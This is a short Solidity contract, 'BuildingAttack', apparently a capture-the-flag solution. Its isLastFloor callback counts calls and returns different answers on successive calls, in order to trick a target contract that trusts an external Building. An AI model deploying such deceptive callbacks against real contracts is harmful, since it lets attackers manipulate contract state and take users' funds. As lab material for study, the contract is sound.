pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract BuildingAttack is Building {
    uint256 private callCount;

    function isLastFloor(uint256 _floor) external override returns (bool) {
        callCount += 1;
        return callCount == 1;
    }

    function getCallCount() public view returns (uint256) {
        return callCount;
    }
}